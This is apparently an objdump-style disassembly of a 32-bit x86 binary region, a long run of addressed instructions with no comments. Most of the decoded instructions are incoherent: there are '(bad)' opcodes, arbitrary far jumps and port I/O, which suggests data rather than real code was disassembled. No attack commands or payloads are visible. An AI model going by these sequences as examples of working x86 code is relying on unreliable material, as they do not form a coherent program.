  42d9d3:	fisub  DWORD PTR [edx-0x47b7c4e]
  42d9d9:	push   esp
  42d9da:	(bad)  
  42d9db:	leave  
  42d9dc:	dec    edx
  42d9dd:	test   al,0x12
  42d9df:	call   0xc71a5015
  42d9e4:	push   eax
  42d9e5:	(bad)  
  42d9e6:	int3   
  42d9e7:	pop    esi
  42d9e8:	fmul   DWORD PTR [ecx]
  42d9ea:	dec    edi
  42d9eb:	pushf  
  42d9ec:	retf   0xde
	...
  42da53:	add    BYTE PTR [eax],al
  42da55:	add    cl,bh
  42da57:	mov    cl,0x70
  42da59:	dec    eax
  42da5a:	js     0x42da25
  42da5c:	stc    
  42da5d:	mov    cl,0xbf
  42da5f:	dec    edi
  42da60:	int    0xe1
  42da62:	repnz push 0xe9676077
  42da68:	add    DWORD PTR [eax],eax
  42da6a:	add    BYTE PTR [ecx],al
  42da6c:	add    BYTE PTR [eax],al
  42da6e:	or     dh,BYTE PTR [edx+0x68]
  42da71:	out    0xc0,al
  42da73:	enter  0xe871,0xd7
  42da77:	push   ecx
  42da78:	cmp    ah,BYTE PTR [ebp+ebx*1+0x5ebdf669]
  42da7f:	je     0x42da02
  42da81:	and    BYTE PTR [eax+eiz*2],bl
  42da84:	(bad)
  42da87:	mov    BYTE PTR [eax-0x1c],ch
  42da8a:	sub    BYTE PTR [ecx],cl
  42da8c:	xchg   edi,eax
  42da8d:	add    BYTE PTR [edx+edx*1],dl
  42da90:	shr    DWORD PTR [ecx-0xa],cl
  42da93:	or     edi,DWORD PTR [edx]
  42da95:	cs das 
  42da97:	or     al,0x9
  42da99:	fninit 
  42da9b:	add    al,0xcb
  42da9d:	xor    al,0x40
  42da9f:	xor    BYTE PTR [ebp+0x53d4cd89],0x26
  42daa6:	xor    eax,0xabca68b2
  42daab:	mov    al,0xb9
  42daad:	or     ebp,esp
  42daaf:	and    BYTE PTR [edx-0x2f],ah
  42dab2:	and    BYTE PTR [eax],ah
  42dab4:	lods   eax,DWORD PTR ds:[esi]
  42dab5:	imul   edi,DWORD PTR [ecx],0x4935923e
  42dabb:	pusha  
  42dabc:	and    DWORD PTR [edx-0x1],0xae728dfc
  42dac3:	and    ebx,eax
  42dac5:	mov    bl,al
  42dac7:	cmp    al,0xe7
  42dac9:	std    
  42daca:	sub    eax,0x6a9d250b
  42dacf:	cmp    eax,0x3ec006ee
  42dad4:	retf   0xc6d2
  42dad7:	cmp    BYTE PTR [ecx],al
  42dad9:	jno    0x42db49
  42dadb:	jmp    0x8a85:0x7473ded7
  42dae2:	shl    ah,0x2a
  42dae5:	lahf   
  42dae6:	push   ecx
  42dae7:	ss and al,0xd3
  42daea:	dec    edx
  42daeb:	cmp    edx,DWORD PTR [esi+0x33]
  42daee:	push   ss
  42daef:	adc    eax,0x876619a0
  42daf4:	sbb    al,0x6
  42daf6:	aam    0x2
  42daf8:	push   ebp
  42daf9:	sahf   
  42dafa:	and    edx,eax
  42dafc:	mov    edi,0xd301a7db
  42db01:	sbb    dl,BYTE PTR [esi+0x4e]
  42db04:	out    dx,al
  42db05:	sti    
  42db06:	and    dh,BYTE PTR [ebp-0x1f]
  42db09:	add    edx,0xd65d3e03
  42db0f:	out    dx,eax
  42db10:	mov    BYTE PTR [ebx+0x72],al
  42db13:	call   0x2fc6cc1c
  42db18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42db19:	cdq    
  42db1a:	inc    ebx
  42db1b:	test   eax,0x506fafbd
  42db20:	add    dl,ch
  42db22:	push   ecx
  42db23:	retf   0xd3d3
  42db26:	cwde   
  42db27:	push   esi
  42db28:	xor    ebp,edi
  42db2a:	push   cs
  42db2b:	out    dx,al
  42db2c:	mov    al,0x12
  42db2e:	aad    0xc3
  42db30:	imul   edx,DWORD PTR [ebx-0x7111f535],0x5f5976b1
  42db3a:	sbb    eax,0xb088c636
  42db3f:	adc    BYTE PTR [esi+0x33],dh
  42db42:	ret    0x217b
  42db45:	xchg   ebp,eax
  42db46:	push   esi
  42db47:	mov    ds:0xfc297d9d,al
  42db4c:	fld    DWORD PTR [ebx+0x61ed7ba1]
  42db52:	xchg   edi,eax
  42db53:	pop    esi
  42db54:	(bad)  
  42db55:	pop    ebp
  42db56:	mov    BYTE PTR [edi-0x35],al
  42db59:	pusha  
  42db5a:	ret    
  42db5b:	ss sti 
  42db5d:	add    DWORD PTR [eax],0xffffffb6
  42db60:	mov    dh,BYTE PTR [ecx]
  42db62:	stos   DWORD PTR es:[edi],eax
  42db63:	arpl   ax,dx
  42db65:	pop    esi
  42db66:	mov    DWORD PTR [edi+0x78d7267],edi
  42db6c:	cmp    ebp,0x0
	...
  42dbd3:	add    BYTE PTR [eax],al
  42dbd5:	add    BYTE PTR [eax-0x2093e086],dh
  42dbdb:	ins    DWORD PTR es:[edi],dx
  42dbdc:	repz (bad) 
  42dbde:	fwait
  42dbdf:	jns    0x42db7c
  42dbe1:	jns    0x42dc4e
  42dbe3:	test   edx,esi
  42dbe5:	retf   0xea67
  42dbe8:	add    DWORD PTR [eax],eax
  42dbea:	add    BYTE PTR [ecx],al
  42dbec:	add    BYTE PTR [eax],al
  42dbee:	inc    eax
  42dbef:	ret    
  42dbf0:	aad    0xd0
  42dbf2:	test   BYTE PTR [edi],0x98
  42dbf5:	adc    edx,DWORD PTR [edx]
  42dbf7:	out    dx,al
  42dbf8:	xor    ebp,ebx
  42dbfa:	add    BYTE PTR [ebx-0x507847bc],0x51
  42dc01:	bound  ebp,QWORD PTR [edx]
  42dc03:	arpl   WORD PTR [eax],dx
  42dc05:	sti    
  42dc06:	xchg   ebx,eax
  42dc07:	aas    
  42dc08:	stc    
  42dc09:	xchg   ecx,eax
  42dc0a:	xchg   ebp,eax
  42dc0b:	fsubr  DWORD PTR [esi+0x77b9ea81]
  42dc11:	clc    
  42dc12:	dec    edx
  42dc13:	aam    0x15
  42dc15:	add    dl,ah
  42dc17:	dec    edi
  42dc18:	daa    
  42dc19:	mov    eax,ds:0x766f492c
  42dc1e:	mov    eax,0x41ab7283
  42dc23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc24:	ret    
  42dc25:	pop    edx
  42dc26:	mov    ecx,0xb1f4f3c5
  42dc2b:	mov    dl,0xd8
  42dc2d:	fbld   TBYTE PTR [ebp-0x40]
  42dc30:	sbb    al,0x2a
  42dc32:	push   0x5b
  42dc34:	jmp    0x5c95:0xd99057ea
  42dc3b:	clc    
  42dc3c:	test   BYTE PTR [edx-0x1f],bh
  42dc3f:	mov    edi,0x6d0dd2ae
  42dc44:	xchg   ecx,eax
  42dc45:	or     eax,ecx
  42dc47:	or     edx,DWORD PTR [edx+0x3ac0b731]
  42dc4d:	pop    edx
  42dc4e:	imul   edx,DWORD PTR [ebp+0x21],0x492dbbbb
  42dc55:	inc    ebp
  42dc56:	retf   
  42dc57:	outs   dx,BYTE PTR ds:[esi]
  42dc58:	ins    DWORD PTR es:[edi],dx
  42dc59:	sbb    DWORD PTR [ecx-0x43],edi
  42dc5c:	jp     0x42dbf5
  42dc5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dc5f:	and    ebx,esp
  42dc61:	jnp    0x42dc61
  42dc63:	outs   dx,BYTE PTR ds:[esi]
  42dc64:	mov    edx,0xcb8a0304
  42dc69:	cdq    
  42dc6a:	mov    es,WORD PTR [edx+0x48]
  42dc6d:	and    ebx,DWORD PTR [edx]
  42dc6f:	mov    DWORD PTR [ecx],edx
  42dc71:	and    ecx,eax
  42dc73:	pop    esp
  42dc74:	pop    edx
  42dc75:	mov    ch,ah
  42dc77:	mov    ecx,0xfd63748f
  42dc7c:	adc    eax,0xa74ed1be
  42dc81:	daa    
  42dc82:	push   ss
  42dc83:	sub    BYTE PTR [edx-0x103686c3],0x14
  42dc8a:	imul   ecx,DWORD PTR [edi+0x532257c1],0xffffffa2
  42dc91:	sar    esi,cl
  42dc93:	fstp   TBYTE PTR [ecx]
  42dc95:	repnz inc esp
  42dc97:	daa    
  42dc98:	hlt    
  42dc99:	repz push ebx
  42dc9b:	stos   BYTE PTR es:[edi],al
  42dc9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dc9d:	out    0x71,al
  42dc9f:	jbe    0x42dc31
  42dca1:	mov    BYTE PTR [ebx-0x7bf9ee17],bh
  42dca7:	neg    ebp
  42dca9:	push   ss
  42dcaa:	cmp    eax,0x2996aad0
  42dcaf:	inc    esi
  42dcb0:	xchg   ebp,eax
  42dcb1:	not    cl
  42dcb3:	sub    DWORD PTR [ebx-0x73],ebp
  42dcb6:	mov    esi,0x366797c7
  42dcbb:	imul   ebp,DWORD PTR [edi],0xdad372db
  42dcc1:	adc    BYTE PTR [si],dl
  42dcc4:	adc    esi,esp
  42dcc6:	cmp    al,0x8a
  42dcc8:	inc    edi
  42dcc9:	mov    eax,0x2ab64fa
  42dcce:	or     eax,0xef30b222
  42dcd3:	jns    0x42dd4b
  42dcd5:	scas   al,BYTE PTR es:[edi]
  42dcd6:	popa   
  42dcd7:	xchg   edx,eax
  42dcd8:	pop    ebx
  42dcd9:	jl     0x42dc5f
  42dcdb:	loopne 0x42dc67
  42dcdd:	mul    eax
  42dcdf:	iret   
  42dce0:	pusha  
  42dce1:	out    0xc7,eax
  42dce3:	stos   DWORD PTR es:[edi],eax
  42dce4:	mov    edx,0xb4a9a347
  42dce9:	mov    eax,0x7706417
	...
  42dd56:	cmp    DWORD PTR [edi-0x2010f093],esi
  42dd5c:	jnp    0x42dd15
  42dd5e:	adc    BYTE PTR [eax],ch
  42dd60:	jne    0x42dd48
  42dd62:	fwait
  42dd63:	jo     0x42ddcb
  42dd65:	mov    cl,0x67
  42dd67:	jmp    0x42dd6a
  42dd69:	add    BYTE PTR [eax],al
  42dd6b:	add    DWORD PTR [eax],eax
  42dd6d:	add    BYTE PTR [eax],bl
  42dd6f:	or     bh,bl
  42dd71:	ins    BYTE PTR es:[edi],dx
  42dd72:	inc    edx
  42dd73:	lods   al,BYTE PTR ds:[esi]
  42dd74:	jmp    0x42ddb9
  42dd76:	lahf   
  42dd77:	xchg   edi,eax
  42dd78:	sbb    eax,0xe9daf104
  42dd7d:	popa   
  42dd7e:	and    BYTE PTR [ecx-0x416937c7],ah
  42dd84:	inc    edi
  42dd85:	xchg   BYTE PTR [ecx-0x641e6aee],dl
  42dd8b:	pushf  
  42dd8c:	and    al,0x1c
  42dd8e:	loopne 0x42ddce
  42dd90:	sbb    esp,DWORD PTR [ebx+ebx*8]
  42dd93:	leave  
  42dd94:	int3   
  42dd95:	xchg   edi,eax
  42dd96:	data16 shl BYTE PTR [ecx-0x36],1
  42dd9a:	and    cl,ch
  42dd9c:	xlat   BYTE PTR ds:[ebx]
  42dd9d:	(bad)  
  42dd9e:	mov    bl,0xd4
  42dda0:	mov    cl,0xad
  42dda2:	pop    ebp
  42dda3:	and    eax,0xeee15089
  42dda8:	fcomp  st(0)
  42ddaa:	add    DWORD PTR [edx],edx
  42ddac:	push   ebp
  42ddad:	xor    ch,al
  42ddaf:	popw   ss
  42ddb1:	lahf   
  42ddb2:	fwait
  42ddb3:	mov    bp,0x3847
  42ddb7:	ins    DWORD PTR es:[edi],dx
  42ddb8:	stos   DWORD PTR es:[edi],eax
  42ddb9:	and    esi,ecx
  42ddbb:	jmp    0x5578e521
  42ddc0:	fist   DWORD PTR [ebx-0x23]
  42ddc3:	mov    ds:0x608cf122,eax
  42ddc8:	dec    esp
  42ddc9:	jmp    0x42ddda
  42ddcb:	imul   esi,DWORD PTR [edi+0x1f3dba25],0xce917405
  42ddd5:	jmp    0x32a2:0x96aceaf0
  42dddc:	cmp    al,0x82
  42ddde:	push   0x57847239
  42dde3:	sti    
  42dde4:	sbb    eax,ecx
  42dde6:	sbb    dh,cl
  42dde8:	push   ebp
  42dde9:	fnstsw WORD PTR [eax]
  42ddeb:	sub    eax,0x9aaad735
  42ddf0:	int3   
  42ddf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ddf2:	xchg   esp,eax
  42ddf3:	iret   
  42ddf4:	in     eax,dx
  42ddf5:	jae    0x42de31
  42ddf7:	mov    esi,0xfa14d375
  42ddfc:	stc    
  42ddfd:	nop
  42ddfe:	out    0x4d,al
  42de00:	sub    eax,0xd42a0953
  42de05:	aaa    
  42de06:	lock mov ah,0xc
  42de09:	sub    al,0xa3
  42de0b:	cmc    
  42de0c:	cmp    DWORD PTR [edx+0x4f76b23b],ebx
  42de12:	push   edi
  42de13:	lahf   
  42de14:	stc    
  42de15:	inc    esp
  42de16:	ds and eax,0xce270086
  42de1c:	outs   dx,BYTE PTR es:[esi]
  42de1e:	test   DWORD PTR [ebp-0x3c],ebx
  42de21:	mov    esi,0xf728973d
  42de26:	jecxz  0x42dea7
  42de28:	in     al,dx
  42de29:	mov    bl,BYTE PTR [ecx]
  42de2b:	push   edx
  42de2c:	in     eax,0xd5
  42de2e:	fld    TBYTE PTR [ebp-0x23231208]
  42de34:	imul   ecx,DWORD PTR [edi+esi*2+0x40cb9aa8],0x78
  42de3c:	adc    eax,0x2a42f6ba
  42de41:	sub    ebp,DWORD PTR [edx+0x30]
  42de44:	aaa    
  42de45:	scas   eax,DWORD PTR es:[edi]
  42de46:	stc    
  42de47:	xchg   ebp,eax
  42de48:	xor    ecx,DWORD PTR [ecx+ebp*1+0x77a63198]
  42de4f:	dec    eax
  42de50:	outs   dx,BYTE PTR ds:[esi]
  42de51:	or     BYTE PTR [ebx-0x69],0x9
  42de55:	mov    eax,0xfda42b57
  42de5a:	xchg   esp,eax
  42de5b:	lods   eax,DWORD PTR ds:[esi]
  42de5c:	daa    
  42de5d:	scas   eax,DWORD PTR es:[edi]
  42de5e:	mov    esi,0x835c6aa0
  42de63:	lea    edi,[esi]
  42de65:	add    DWORD PTR [ebx+0x387a2849],ecx
  42de6b:	jmp    0x42de5c
  42de6d:	jb     0x42de6f
	...
  42ded3:	add    BYTE PTR [eax],al
  42ded5:	add    dh,ah
  42ded7:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42dede:	fist   DWORD PTR [ebp-0x79]
  42dee1:	das    
  42dee2:	orps   xmm5,XMMWORD PTR [edi]
  42dee5:	jmp    0x100:0x1ec67
  42deec:	add    BYTE PTR [eax],al
  42deee:	mov    esp,DWORD PTR [edi]
  42def0:	dec    ecx
  42def1:	fmul   st(2),st
  42def3:	test   eax,0x98b2cb2e
  42def8:	mov    ch,0x6a
  42defa:	ins    DWORD PTR es:[edi],dx
  42defb:	std    
  42defc:	sar    ch,1
  42defe:	or     BYTE PTR [ebp+0x4919dfb5],bh
  42df04:	repnz inc ebp
  42df06:	adc    eax,ebp
  42df08:	push   es
  42df09:	mov    esp,0xa2ce1958
  42df0e:	sub    eax,0xd266f1d0
  42df13:	(bad)  
  42df14:	imul   ebx,DWORD PTR [ecx+0x490c1c06],0x35
  42df1b:	out    0xe3,al
  42df1d:	add    al,0xe1
  42df1f:	or     cl,BYTE PTR [edi+0x52]
  42df22:	gs ss xchg bh,bl
  42df26:	cdq    
  42df27:	dec    ebx
  42df28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df29:	mov    eax,ds:0xd2f36ab3
  42df2e:	push   edx
  42df2f:	and    BYTE PTR [ecx],0xae
  42df32:	xor    eax,0xcc0235e0
  42df37:	lods   al,BYTE PTR ds:[esi]
  42df38:	adc    eax,0xbc735287
  42df3d:	xchg   ebp,ebp
  42df3f:	push   cs
  42df40:	enter  0xd8e,0x73
  42df44:	or     BYTE PTR [esi+0xaa2e8db],ah
  42df4a:	mov    edi,0x58255580
  42df4f:	aaa    
  42df50:	cmp    al,0x55
  42df52:	adc    eax,0xc5b1d9a3
  42df57:	mov    cl,0xed
  42df59:	fdivr  st,st(5)
  42df5b:	or     eax,0xb31b1eac
  42df60:	sub    al,0x1e
  42df62:	repnz mov ebx,0x9be45656
  42df68:	test   DWORD PTR [eax-0x7f],edi
  42df6b:	fldcw  WORD PTR [eax]
  42df6d:	cmp    dl,dl
  42df6f:	dec    eax
  42df70:	add    al,0x8b
  42df72:	dec    ebp
  42df73:	adc    DWORD PTR [edi],ebx
  42df75:	dec    esi
  42df76:	push   0xffffffc4
  42df78:	sahf   
  42df79:	cwde   
  42df7a:	loope  0x42df21
  42df7c:	clc    
  42df7d:	inc    edi
  42df7e:	cli    
  42df7f:	mov    bl,0x41
  42df81:	jmp    0xe7549821
  42df86:	xor    al,0x80
  42df88:	stos   BYTE PTR es:[edi],al
  42df89:	rol    BYTE PTR [esi-0x31a26f29],cl
  42df8f:	test   eax,0x77360855
  42df94:	add    BYTE PTR [eax-0x1a],al
  42df97:	lock cmp al,0x5e
  42df9a:	aaa    
  42df9b:	out    dx,al
  42df9c:	pop    edx
  42df9d:	push   ss
  42df9e:	les    esp,FWORD PTR cs:[eax-0x6ae780fa]
  42dfa5:	test   DWORD PTR [edi-0x2f],esi
  42dfa8:	inc    eax
  42dfa9:	aas    
  42dfaa:	dec    ebx
  42dfab:	mov    ebp,0xca1fb3b8
  42dfb0:	push   0x26af5aaa
  42dfb5:	xchg   esi,eax
  42dfb6:	out    dx,al
  42dfb7:	dec    BYTE PTR [ebp+0x3af78c16]
  42dfbd:	xchg   ebp,eax
  42dfbe:	shl    BYTE PTR [ebx-0x1f],1
  42dfc1:	arpl   WORD PTR [esi],ax
  42dfc3:	sbb    al,0xf3
  42dfc5:	add    al,0x22
  42dfc7:	(bad)  
  42dfc8:	mov    eax,ds:0xd4628922
  42dfcd:	jmp    0x9138733f
  42dfd2:	scas   eax,DWORD PTR es:[edi]
  42dfd3:	mov    ?,WORD PTR [edx-0x26297bf4]
  42dfd9:	jl     0x42df9d
  42dfdb:	xchg   edx,eax
  42dfdc:	sar    ah,1
  42dfde:	jnp    0x42df82
  42dfe0:	retf   
  42dfe1:	mov    ah,BYTE PTR [ebx+ebp*1]
  42dfe4:	stc    
  42dfe5:	outs   dx,DWORD PTR ds:[esi]
  42dfe6:	adc    DWORD PTR [ecx+0x39be2054],ecx
  42dfec:	outs   dx,BYTE PTR ds:[esi]
  42dfed:	cdq    
	...
  42e056:	add    bh,dh
  42e058:	jb     0x42e000
  42e05a:	(bad)  
  42e05b:	scas   al,BYTE PTR es:[edi]
  42e05c:	(bad)  
  42e05d:	dec    BYTE PTR [edi-0x30]
  42e060:	fisttp WORD PTR [esi-0x2e]
  42e063:	xlat   BYTE PTR ds:[ebx]
  42e064:	pop    edx
  42e065:	pop    ebx
  42e066:	addr16 in eax,dx
  42e068:	add    DWORD PTR [eax],eax
  42e06a:	add    BYTE PTR [ecx],al
  42e06c:	add    BYTE PTR [eax],al
  42e06e:	inc    edi
  42e06f:	cmc    
  42e070:	mov    bh,0x88
  42e072:	add    DWORD PTR [ebx*2-0x6fd404ec],esp
  42e079:	(bad)  
  42e07a:	push   esi
  42e07b:	add    DWORD PTR [edi-0x51],0x57
  42e07f:	call   0xcfa5e9a0
  42e084:	push   ss
  42e085:	mov    cl,0x7c
  42e087:	push   esi
  42e088:	xor    BYTE PTR [ecx-0x4b61947c],0x74
  42e08f:	jp     0x42e096
  42e091:	scas   eax,DWORD PTR es:[edi]
  42e092:	scas   eax,DWORD PTR es:[edi]
  42e093:	xor    bl,al
  42e095:	aaa    
  42e096:	bound  ecx,QWORD PTR [eax]
  42e098:	outs   dx,DWORD PTR ds:[esi]
  42e099:	jo     0x42e053
  42e09b:	jnp    0x42e0a9
  42e09d:	pop    ecx
  42e09e:	retf   0xaf13
  42e0a1:	jl     0x42e10c
  42e0a3:	test   BYTE PTR [ebp-0x582a0885],bl
  42e0a9:	push   edi
  42e0aa:	xchg   BYTE PTR [esp-0x79],dh
  42e0ae:	and    ebx,DWORD PTR [ebp+0x73f6738]
  42e0b4:	repz enter 0x539f,0x65
  42e0b9:	cwde   
  42e0ba:	cs stc 
  42e0bc:	psubusw mm1,QWORD PTR [eax+0x6]
  42e0c0:	push   ds
  42e0c1:	mov    bh,0x3f
  42e0c3:	inc    esi
  42e0c4:	push   edx
  42e0c5:	imul   eax,eax,0x9abd63c1
  42e0cb:	mov    cl,0xc7
  42e0cd:	mov    eax,ds:0xa11af09b
  42e0d2:	test   dh,bl
  42e0d4:	jl     0x42e142
  42e0d6:	push   ebx
  42e0d7:	xor    cl,ch
  42e0d9:	test   eax,0xfbe9ff8
  42e0de:	mov    BYTE PTR [ebp-0x26],bl
  42e0e1:	dec    ecx
  42e0e2:	or     DWORD PTR [edi+0x529c836e],0xffffffff
  42e0e9:	(bad)  
  42e0eb:	adc    ecx,ecx
  42e0ed:	xor    BYTE PTR [esi-0x54],0xce
  42e0f1:	lds    edx,FWORD PTR [eax+0x2b]
  42e0f4:	mov    eax,0x68752cb1
  42e0f9:	call   0x3f95:0xfda16cca
  42e100:	retf   
  42e101:	cmp    BYTE PTR [ebp-0x40178719],0x6e
  42e108:	cmp    DWORD PTR [esi-0xbef6132],eax
  42e10e:	pop    edx
  42e10f:	loop   0x42e13b
  42e111:	das    
  42e112:	mov    dl,0x87
  42e114:	(bad)  
  42e115:	xor    ch,BYTE PTR ds:0x3e385a90
  42e11b:	mov    edx,0xcdbb986b
  42e120:	sub    eax,0x47458c91
  42e125:	pop    edi
  42e126:	dec    ecx
  42e127:	mov    esi,DWORD PTR [edx-0x2116db7a]
  42e12d:	jno    0x42e0b1
  42e12f:	dec    edx
  42e130:	pop    ecx
  42e131:	push   es
  42e132:	lock ret 0x58fd
  42e136:	or     cl,BYTE PTR [edx+0x1b43de9e]
  42e13c:	ret    
  42e13d:	loope  0x42e13f
  42e13f:	mov    WORD PTR [eax+edi*2],fs
  42e142:	adc    ebx,DWORD PTR [ecx+0x3e18e3ca]
  42e148:	aaa    
  42e149:	mov    bh,0x74
  42e14b:	dec    esp
  42e14c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e14d:	lock int 0x67
  42e150:	dec    ecx
  42e151:	jae    0x42e14b
  42e153:	mov    ebx,0x29da2ba6
  42e158:	or     DWORD PTR [edx+0xdb1195e],ecx
  42e15e:	jge    0x42e1b3
  42e160:	xchg   ebp,eax
  42e161:	xor    BYTE PTR [eax+edx*1-0x38],al
  42e165:	lock mov ch,0x6c
  42e168:	stos   BYTE PTR es:[edi],al
  42e169:	pop    esi
  42e16a:	out    0x4d,al
  42e16c:	push   ecx
  42e16d:	inc    ebx
	...
  42e1d6:	mov    eax,ds:0x7e061ecf
  42e1db:	xlat   BYTE PTR ds:[ebx]
  42e1dc:	mov    ecx,0x35bb80ef
  42e1e1:	xchg   edi,eax
  42e1e2:	adc    ecx,DWORD PTR [edx]
  42e1e4:	stos   DWORD PTR es:[edi],eax
  42e1e5:	aam    0x67
  42e1e7:	out    dx,al
  42e1e8:	add    DWORD PTR [eax],eax
  42e1ea:	add    BYTE PTR [ecx],al
  42e1ec:	add    BYTE PTR [eax],al
  42e1ee:	outs   dx,DWORD PTR ds:[esi]
  42e1ef:	clc    
  42e1f0:	xchg   esp,eax
  42e1f1:	push   cs
  42e1f2:	inc    ebp
  42e1f3:	mov    eax,ds:0xf8eadbd1
  42e1f8:	add    ah,ah
  42e1fa:	push   0x3f05d87b
  42e1ff:	nop
  42e200:	js     0x42e27f
  42e202:	dec    ecx
  42e203:	sub    DWORD PTR [esi-0x52],edi
  42e206:	js     0x42e19e
  42e208:	inc    esp
  42e209:	dec    esi
  42e20a:	jl     0x42e195
  42e20c:	push   esp
  42e20d:	ror    BYTE PTR [ecx+0xe402538],0x73
  42e214:	sbb    DWORD PTR [ebp+0x78],edx
  42e217:	lahf   
  42e218:	add    al,0xb0
  42e21a:	adc    eax,0x78914a96
  42e21f:	mov    al,ds:0x15d05da3
  42e224:	and    eax,0x69b0ade
  42e229:	loope  0x42e21f
  42e22b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e22c:	xchg   BYTE PTR [edi],bh
  42e22e:	push   edx
  42e22f:	mov    dh,0xa
  42e231:	or     DWORD PTR [edx-0xcd9000f],0x83afe99a
  42e23b:	dec    eax
  42e23c:	xchg   esp,eax
  42e23d:	add    esi,DWORD PTR [esi]
  42e23f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e240:	adc    esp,ebp
  42e242:	ins    BYTE PTR es:[edi],dx
  42e243:	pop    ss
  42e244:	inc    esi
  42e245:	call   0xeac6:0x462220b2
  42e24c:	leave  
  42e24d:	idiv   DWORD PTR [ecx+esi*1+0x50]
  42e251:	jb     0x42e1f1
  42e253:	push   0x9e2bae82
  42e258:	cmp    eax,0xe2b7fc6
  42e25d:	ds dec ecx
  42e25f:	and    DWORD PTR [esi-0x4a],eax
  42e262:	gs and eax,0xcd5ebe9c
  42e268:	pop    ds
  42e269:	sub    al,0x6f
  42e26b:	shl    BYTE PTR [esi+eiz*2+0x2e626f68],cl
  42e272:	ds dec ebp
  42e274:	nop
  42e275:	or     DWORD PTR [ecx+0x4],edx
  42e278:	add    eax,0xd5610851
  42e27d:	cld    
  42e27e:	icebp  
  42e27f:	lds    esp,FWORD PTR [eax+0x1b]
  42e282:	ja     0x42e248
  42e284:	fs int 0xa8
  42e287:	add    DWORD PTR [eax+0x50a0872d],ebp
  42e28d:	cmp    ebp,0xca56c2e1
  42e293:	sahf   
  42e294:	mov    ds:0x3098c509,al
  42e299:	adc    bl,BYTE PTR [edi-0x60]
  42e29c:	in     eax,dx
  42e29d:	xchg   edi,eax
  42e29e:	pop    edi
  42e29f:	rol    DWORD PTR [eax+0x56a9fa26],0xfc
  42e2a6:	(bad)  
  42e2a7:	imul   ebx,DWORD PTR [eax-0x6a],0xfba2bac9
  42e2ae:	sar    DWORD PTR [ebp-0x4292ace5],cl
  42e2b4:	pop    esp
  42e2b5:	jl     0x42e304
  42e2b7:	push   edi
  42e2b8:	stos   BYTE PTR es:[edi],al
  42e2b9:	cmc    
  42e2ba:	int    0x38
  42e2bc:	jl     0x42e290
  42e2be:	jge    0x42e30a
  42e2c0:	stc    
  42e2c1:	dec    bl
  42e2c3:	sbb    esi,edx
  42e2c5:	test   BYTE PTR [ecx],dh
  42e2c7:	retf   
  42e2c8:	or     eax,DWORD PTR [ecx-0x581c6e90]
  42e2ce:	fild   WORD PTR [edx]
  42e2d0:	stos   DWORD PTR es:[edi],eax
  42e2d1:	inc    edx
  42e2d2:	cld    
  42e2d3:	loop   0x42e2a5
  42e2d5:	xor    al,0x70
  42e2d7:	push   0x59726d88
  42e2dc:	jnp    0x42e33c
  42e2de:	jns    0x42e31e
  42e2e0:	and    eax,0x502968c
  42e2e5:	inc    ecx
  42e2e6:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  42e2e8:	fnstcw WORD PTR [esi+ebp*2]
  42e2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e2ec:	pop    es
  42e2ed:	pop    DWORD PTR [eax]
	...
  42e353:	add    BYTE PTR [eax],al
  42e355:	add    BYTE PTR [ebp-0x655875c3],ch
  42e35b:	mov    bh,0xad
  42e35d:	aas    
  42e35e:	mov    ebx,0xab199140
  42e363:	mov    fs,WORD PTR [esi]
  42e365:	out    dx,eax
  42e366:	addr16 out dx,eax
  42e368:	add    DWORD PTR [eax],eax
  42e36a:	add    BYTE PTR [ecx],al
  42e36c:	add    BYTE PTR [eax],al
  42e36e:	xor    al,0x5b
  42e370:	inc    ecx
  42e371:	jecxz  0x42e3ac
  42e373:	or     esp,DWORD PTR [esi]
  42e375:	jp     0x42e3df
  42e377:	mov    eax,0xc13cebe7
  42e37c:	xor    dl,BYTE PTR [esi+0xcfeb5de]
  42e382:	clc    
  42e383:	arpl   WORD PTR [ebp+0x3e],cx
  42e386:	push   ecx
  42e387:	nop
  42e388:	ret    0x9023
  42e38b:	dec    esp
  42e38c:	xchg   edi,eax
  42e38d:	xchg   BYTE PTR [ebx-0x17],bl
  42e390:	dec    esi
  42e391:	mov    eax,0xfd310122
  42e396:	inc    ebp
  42e397:	es daa 
  42e399:	mov    cl,0x71
  42e39b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e39c:	repz push edx
  42e39e:	sub    al,0xba
  42e3a0:	jmp    0xe71:0x16e5e1f
  42e3a7:	mov    ah,0x5a
  42e3a9:	lods   al,BYTE PTR ds:[esi]
  42e3aa:	movntps XMMWORD PTR [esi+0x69619d3c],xmm4
  42e3b1:	xchg   BYTE PTR [eax-0x5c218288],dh
  42e3b7:	das    
  42e3b8:	in     al,0xfa
  42e3ba:	pop    es
  42e3bb:	mov    edx,0x4b1a7fa6
  42e3c0:	xor    al,0x3
  42e3c2:	das    
  42e3c3:	or     al,0x6e
  42e3c5:	out    dx,al
  42e3c6:	mov    ebx,0x728131ce
  42e3cb:	stos   BYTE PTR es:[edi],al
  42e3cc:	push   cs
  42e3cd:	and    al,0x6a
  42e3cf:	sahf   
  42e3d0:	std    
  42e3d1:	xor    DWORD PTR [ebp-0x7d],esp
  42e3d4:	test   eax,0xe3b4f2ba
  42e3d9:	push   esp
  42e3da:	cmp    DWORD PTR [ecx],0x9f45f62c
  42e3e0:	mov    ah,0x2f
  42e3e2:	inc    ebp
  42e3e3:	clc    
  42e3e4:	pop    ebx
  42e3e5:	and    DWORD PTR [ebp-0xb],edi
  42e3e8:	add    DWORD PTR [ebp+edi*8-0x625511d9],ebx
  42e3ef:	das    
  42e3f0:	dec    edi
  42e3f1:	ficomp WORD PTR [ebx]
  42e3f3:	jmp    0x42e39d
  42e3f5:	mov    ch,0x95
  42e3f7:	pop    ebp
  42e3f8:	dec    esi
  42e3f9:	push   0xffffff8e
  42e3fb:	or     eax,0x3a00529d
  42e400:	jbe    0x42e450
  42e402:	sub    eax,0x1d9644ff
  42e407:	clc    
  42e408:	sub    edx,esp
  42e40a:	leave  
